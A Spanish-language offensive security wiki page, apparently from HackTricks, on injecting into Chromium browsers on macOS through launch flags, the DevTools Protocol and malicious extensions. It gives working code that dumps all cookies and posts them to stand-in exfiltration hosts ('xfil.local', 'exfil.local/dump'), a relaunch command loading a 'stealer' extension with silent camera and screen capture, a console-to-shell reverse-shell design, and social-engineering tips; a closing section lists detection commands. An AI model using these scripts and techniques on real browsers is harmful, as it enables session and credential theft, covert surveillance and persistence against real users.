# Chromium Injection en macOS

{{#include ../../../banners/hacktricks-training.md}}

## Información básica

Los navegadores basados en Chromium, como Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi y Opera, utilizan los mismos command-line switches, archivos de preferencias e interfaces de automatización de DevTools. En macOS, cualquier usuario con acceso a la GUI puede terminar una sesión existente del navegador y volver a abrirla con flags arbitrarios, extensiones o endpoints de DevTools que se ejecutan con los entitlements del objetivo.

#### Iniciar Chromium con flags personalizados en macOS

macOS mantiene una única instancia de UI por perfil de Chromium, por lo que la instrumentación normalmente requiere cerrar el navegador por la fuerza (por ejemplo, con `osascript -e 'tell application "Google Chrome" to quit'`). Los atacantes suelen volver a iniciarlo mediante `open -na "Google Chrome" --args <flags>` para poder inyectar argumentos sin modificar el app bundle. Envolver ese comando en un LaunchAgent del usuario (`~/Library/LaunchAgents/*.plist`) o en un login hook garantiza que el navegador manipulado se reinicie después de un reinicio o cierre de sesión.

#### Flag `--load-extension`

El flag `--load-extension` carga automáticamente extensiones unpacked (rutas separadas por comas). Combínalo con `--disable-extensions-except` para bloquear las extensiones legítimas y forzar la ejecución únicamente de tu payload. Las extensiones maliciosas pueden solicitar permisos de alto impacto, como `debugger`, `webRequest` y `cookies`, para pivotar hacia protocolos de DevTools, modificar headers CSP, degradar HTTPS o exfiltrar material de sesión en cuanto se inicia el navegador.

#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`

Estos switches exponen el Chrome DevTools Protocol (CDP) mediante TCP o un pipe, permitiendo que herramientas externas controlen el navegador. Google observó un abuso generalizado de esta interfaz por parte de infostealers y, desde Chrome 136 (marzo de 2025), los switches se ignoran para el perfil predeterminado, salvo que el navegador se inicie con un `--user-data-dir` no estándar. Esto aplica App-Bound Encryption a los perfiles reales, pero los atacantes aún pueden iniciar un perfil nuevo, inducir a la víctima a autenticarse dentro de él (phishing/triage assistance) y obtener cookies, tokens, estados de confianza del dispositivo o registros de WebAuthn mediante CDP.

#### Flag `--user-data-dir`

Este flag redirige el perfil completo del navegador (History, Cookies, Login Data, archivos de preferencias, etc.) a una ruta controlada por el atacante. Es obligatorio al combinar builds modernos de Chrome con `--remote-debugging-port` y también mantiene aislado el perfil manipulado, de modo que puedes colocar archivos `Preferences` o `Secure Preferences` preconfigurados que deshabiliten security prompts, instalen extensiones automáticamente y cambien los esquemas predeterminados.

#### Flag `--use-fake-ui-for-media-stream`

Este switch evita el permission prompt de la cámara y el micrófono, por lo que cualquier página que llame a `getUserMedia` obtiene acceso inmediatamente. Combínalo con flags como `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` o comandos CDP `Browser.grantPermissions` para capturar audio/vídeo silenciosamente, compartir el escritorio o satisfacer las comprobaciones de permisos de WebRTC sin interacción del usuario.

## Patrones de Delivery y Relaunch observados en la práctica

El abuso de CDP suele ser una fase de **post-exploitation**, en lugar del payload inicial. Una campaña reciente de macOS dirigida a developers utilizó una fase de build **`Run Script`** de Xcode envenenada (`PBXShellScriptBuildPhase`), de modo que el código solo se ejecutaba cuando la víctima **compilaba** el proyecto, no cuando simplemente lo clonaba o abría. Después de esa primera ejecución, el malware también infectaba otros árboles `.xcodeproj`, añadía hooks maliciosos de Git `pre-commit` y buscaba más proyectos de Xcode en archivos ZIP.

En el caso del abuso de Chromium, esto es importante porque el atacante no necesita modificar el browser binary. En su lugar, un stager de corta duración en la build phase / `osascript` puede instalar un **browser wrapper** (LaunchAgent, login item, entrada del Dock, app launcher troyanizado, etc.) que vuelve a abrir el navegador legítimo con flags controlados por el atacante cada vez que el usuario lo inicia.

> [!TIP]
> En endpoints de developers, inspecciona los archivos `.pbxproj`, `.git/hooks/pre-commit` y los ZIP que contengan `.xcodeproj` en busca de `curl`, `osascript`, `xxd`, `base64` anidado o lógica inesperada para volver a iniciar Chrome.

## Remote Debugging y abuso del DevTools Protocol

Una vez que Chrome se vuelve a iniciar con un `--user-data-dir` dedicado y `--remote-debugging-port`, puedes conectarte mediante CDP (por ejemplo, con `chrome-remote-interface`, `puppeteer` o `playwright`) y automatizar workflows de altos privilegios:

- **Robo de cookies/sesiones:** `Network.getAllCookies` y `Storage.getCookies` devuelven valores HttpOnly incluso cuando App-Bound encryption normalmente impediría el acceso al filesystem, porque CDP solicita al navegador en ejecución que los descifre.
- **Manipulación de permisos:** `Browser.grantPermissions` y `Emulation.setGeolocationOverride` permiten omitir los prompts de permisos de cámara/micrófono (especialmente combinados con `--use-fake-ui-for-media-stream`) o falsificar comprobaciones de seguridad basadas en la ubicación.
- **Inyección de keystrokes/scripts:** `Runtime.evaluate` ejecuta JavaScript arbitrario dentro de la pestaña activa, permitiendo extraer credenciales, modificar el DOM o inyectar beacons de persistencia que sobrevivan a la navegación.
- **Exfiltración en vivo:** `Network.webRequestWillBeSentExtraInfo` y `Fetch.enable` interceptan requests/responses autenticados en tiempo real sin tocar artefactos del disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Dado que Chrome 136 bloquea CDP en el perfil predeterminado, copiar el directorio existente `~/Library/Application Support/Google/Chrome` de la víctima a una ruta de staging ya no permite obtener cookies descifradas. En su lugar, aplica ingeniería social al usuario para que se autentique dentro del perfil instrumentado (por ejemplo, mediante una sesión de soporte "útil") o captura tokens MFA en tránsito mediante network hooks controlados por CDP.

### XCSSET-style CDP Backdoor Chain

Un patrón práctico de malware consiste en:

1. Reiniciar el implant o wrapper en userland cada vez que se inicia Chrome.
2. Iniciar el navegador legítimo con `--remote-debugging-port=<port>` y, en Chrome 136+, normalmente con un `--user-data-dir=<dir>` no predeterminado.
3. Iniciar un helper que se conecte al WebSocket CDP local y registre un pre-document hook con `Page.addScriptToEvaluateOnNewDocument`.

Ese helper puede inyectar JavaScript **antes** de que se ejecute el código del sitio, lo que resulta ideal para aplicar hooks a `window.fetch`, `XMLHttpRequest`, wallet providers o flujos de autofill sin modificar archivos en disco.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Una variante más potente convierte el navegador en un **puente de comandos del host**: el JavaScript inyectado emite un `console.log` con una etiqueta delimitadora, el helper local supervisa `Runtime.consoleAPICalled`, elimina el marcador, ejecuta el resto mediante el shell del host (por ejemplo, `exec.Command` de Go) y devuelve stdout/stderr a través del WebSocket del atacante. Esto transforma la ejecución de scripts a nivel de pestaña en una reverse shell mayormente fileless.

## Inyección basada en extensiones mediante la API de Debugger

La investigación de 2023, "Chrowned by an Extension", demostró que una extensión maliciosa que utiliza la API `chrome.debugger` puede conectarse a cualquier pestaña y obtener los mismos poderes de DevTools que `--remote-debugging-port`. Esto rompe las suposiciones originales de aislamiento (las extensiones permanecen en su propio contexto) y permite:

- Robo silencioso de cookies y credenciales mediante `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modificación de permisos de sitios (cámara, micrófono y geolocalización) y bypass de intersticiales de seguridad, permitiendo que las páginas de phishing suplanten los diálogos de Chrome.
- Manipulación on-path de advertencias TLS, descargas o avisos de WebAuthn controlando mediante programación `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` o `Security.handleCertificateError`.

Carga la extensión con `--load-extension`/`--disable-extensions-except` para que no sea necesaria ninguna interacción del usuario. Un script de background mínimo que weaponiza la API tiene este aspecto:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
La extensión también puede suscribirse a eventos `Debugger.paused` para leer variables de JavaScript, modificar scripts inline o colocar breakpoints personalizados que sobrevivan a la navegación. Como todo se ejecuta dentro de la sesión GUI del usuario, Gatekeeper y TCC no se activan, lo que hace que esta técnica sea ideal para malware que ya logró ejecutarse bajo el contexto del usuario.

## Detección y búsqueda

- Genera una alerta cuando los navegadores Chromium se inicien con `--remote-debugging-port`, `--remote-debugging-pipe` o un `--user-data-dir` sospechoso, especialmente cuando el proceso padre sea `bash`, `sh`, `osascript`, `xcodebuild` o un helper de LaunchAgent.
- Busca cadenas cortas en las que un helper abra un WebSocket CDP local, registre `Page.addScriptToEvaluateOnNewDocument` y después establezca una conexión WebSocket/HTTPS saliente de larga duración.
- Busca puentes de console-to-shell correlacionando la actividad de `Runtime.consoleAPICalled` del navegador con shells secundarios o procesos helper que ejecuten comandos proporcionados por el atacante.
- En Macs de desarrolladores, revisa las entradas `PBXShellScriptBuildPhase` de `.pbxproj`, los hooks `pre-commit` de Git, los relanzadores del Dock/elementos de inicio de sesión y los proyectos de Xcode contenidos en ZIP en busca de la instalación de wrappers del navegador.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Herramientas

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiza el lanzamiento de Chromium con extensiones de payload y expone hooks interactivos de CDP.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Herramienta similar centrada en la interceptación de tráfico y la instrumentación del navegador para operadores de macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Librería de Node.js para crear scripts que obtengan datos del Chrome DevTools Protocol (cookies, DOM, permisos) una vez que haya una instancia activa con `--remote-debugging-port`.

### Ejemplo
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Encuentra más ejemplos en los enlaces de tools.

## Referencias

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
